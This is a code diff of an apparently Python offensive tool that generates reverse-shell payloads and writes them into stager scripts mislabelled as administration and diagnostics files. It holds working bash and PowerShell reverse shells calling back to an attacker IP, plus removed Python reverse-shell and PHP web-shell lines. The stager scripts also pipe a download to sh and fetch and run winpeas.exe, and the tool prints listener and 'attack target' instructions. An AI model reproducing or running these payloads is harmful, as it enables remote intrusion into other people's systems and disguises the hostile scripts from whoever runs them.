@@ -5,8 +5,6 @@ import re
 import socket
 from datetime import datetime
 
-OLLAMA_URL = "http://localhost:11434/api/generate"
-
 BANNER = r"""
 =========================================================================================================
  ╔██████╗███████╗ ██████╗████████╗██╗   ██╗███╗   ███╗███████╗███████╗███╗   ███╗██████╗ ██████╗  █████╗ 
@@ -35,19 +33,26 @@ def get_attack_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("10.10.10.10", 80))
-        ip_tuple = s.getsockname()
+        ip_str = s.getsockname()[0]
         s.close()
-        return ip_tuple[0]
+        return ip_str
     except Exception:
         return "YOUR_ATTACK_IP"
 
 def generate_payloads(target_ip, attack_ip, lport):
     """Generates precise, multi-platform staging and listener vectors."""
+    # Fixad strängformatering för powershell för att undvika "newline unexpected" syntaxfel
+    win_ps = (
+        f"$c = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});"
+        f"$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0)"
+        f"{{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);"
+        f"$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ' + '{attack_ip}$ ';"
+        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()}}"
+    )
+    
     payloads = {
         "linux_bash": f"bash -i >& /dev/tcp/{attack_ip}/{lport} 0>&1",
-        "linux_python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attack_ip}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"bash\")'",
-        "windows_powershell": f"$c = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ' + $attack_ip + '$ ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()}}",
-        "php_web": "<?php system($_GET['cmd']); ?>"
+        "windows_powershell": win_ps
     }
     return payloads
 
@@ -64,10 +69,9 @@ def write_linux_payload(target_ip, payloads, lport):
             f.write("echo '[*] Executing Linux administrative stager sequence...'\n")
             f.write(f"echo 'Launching interactive shell connection back to port {lport}...'\n\n")
             
-            # Startar din reverse shell i bakgrunden så att stagen kan rulla vidare
+            # Startar reverse shell i bakgrunden så att linpeas kan laddas ner direkt efter
             f.write(f"{payloads['linux_bash']} &\n\n")
-            
-            # Dynamiskt inbakad stager som laddar ner och kör LinPEAS i minnet
+            f.write("sleep 1\n")
             f.write("echo '[*] Execution window active. Injecting live privilege audit directly into memory...'\n")
             f.write("curl -sL https://github.com | sh\n")
         return filename
@@ -84,12 +88,7 @@ def write_windows_payload(target_ip, payloads, lport):
             f.write(f"# TARGET CONFIGURATION: {target_ip}\n")
             f.write("# ========================================================\n\n")
             f.write("Set-ExecutionPolicy Bypass -Scope Process -Force\n\n")
-            f.write("Write-Host '[*] Initializing multi-platform compilation matrix...' -ForegroundColor Cyan\n")
-            
-            # Startar din Windows reverse shell loop
             f.write(f"{payloads['windows_powershell']}\n\n")
-            
-            # Post-Exploitation live memory stager för WinPEAS
             f.write("Write-Host '[*] Session stabilized. Injecting local environment diagnostics...' -ForegroundColor Cyan\n")
             f.write("pwsh -Command \"Invoke-WebRequest -Uri 'https://github.com' -OutFile 'winpeas.exe'; .\\winpeas.exe; Remove-Item .\\winpeas.exe -Force\"\n")
         return filename
@@ -122,10 +121,12 @@ def main():
         print(f"[███] Linux Administration Script Ready:   {os.getcwd()}/{linux_file} 🔥")
         print(f"[███] Windows PowerShell Automation Ready: {os.getcwd()}/{win_file} 🔥")
         print("="*74)
-        print(f"\n[!] Standard operational instructions:")
-        print(f" 1. Open a new terminal tab and start your handler socket: nc -lvnp {lport}")
-        print(f" 2. Deploy your generated script file against the target entry point verified by NetWeave.")
-        print(f" 3. Once inside, the embedded live diagnostics routine maps out privilege escalation paths automatically.")
+        print(f"\n[!] TACTICAL DEPLOYMENT COMMANDS:")
+        print(f" 1. Open your listener socket in a separate terminal: nc -lvnp {lport}")
+        print(f" 2. To attack a Linux target, run this exact command:")
+        print(f"    bash {linux_file}")
+        print(f" 3. To attack a Windows target, run this exact command:")
+        print(f"    powershell .\\{win_file}")
     else:
         print("\n[-] Error: Failed to write automated deployment scripts to current directory structure.")
 
